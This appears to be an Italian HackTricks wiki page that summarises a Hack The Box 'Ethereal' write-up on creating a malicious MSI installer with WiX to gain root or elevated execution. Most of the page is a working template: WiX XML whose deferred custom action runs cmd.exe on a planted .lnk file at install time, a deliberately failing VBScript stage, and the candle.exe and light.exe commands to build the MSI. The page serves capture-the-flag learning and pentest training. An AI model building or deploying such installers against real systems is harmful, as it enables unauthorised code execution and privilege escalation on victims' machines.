# Creare un MSI malevolo e ottenere root

{{#include ../../banners/hacktricks-training.md}}

La creazione dell'installer MSI verrà effettuata utilizzando wixtools, nello specifico verrà utilizzato [wixtools](http://wixtoolset.org). È opportuno menzionare che sono stati provati builder MSI alternativi, ma non hanno avuto successo in questo caso specifico.<sup>[[1]](#references)</sup>

Per una comprensione completa degli esempi di utilizzo di wix MSI, è consigliabile consultare [questa pagina](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Qui sono disponibili vari esempi che dimostrano l'utilizzo di wix MSI.<sup>[[2]](#references)</sup>

L'obiettivo è generare un MSI che esegua il file lnk. Per ottenere questo risultato, si potrebbe utilizzare il seguente codice XML ([xml da qui](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
È importante notare che l'elemento Package contiene attributi come InstallerVersion e Compressed, che specificano rispettivamente la versione dell'installer e indicano se il package è compresso o meno.

Il processo di creazione prevede l'utilizzo di candle.exe, uno strumento di wixtools, per generare un wixobject da msi.xml. Deve essere eseguito il seguente comando:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Inoltre, vale la pena menzionare che nel post è presente un'immagine che mostra il comando e il relativo output. Puoi consultarla come riferimento visivo.<sup>[[1]](#references)</sup>

Inoltre, verrà utilizzato light.exe, un altro tool di wixtools, per creare il file MSI dal wixobject. Il comando da eseguire è il seguente:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Analogamente al comando precedente, nel post è inclusa un'immagine che illustra il comando e il relativo output.<sup>[[1]](#references)</sup>

Tieni presente che, sebbene questo riepilogo miri a fornire informazioni utili, è consigliabile fare riferimento al post originale per dettagli più completi e istruzioni accurate.<sup>[[1]](#references)</sup>

## Riferimenti

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (vedi anche [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
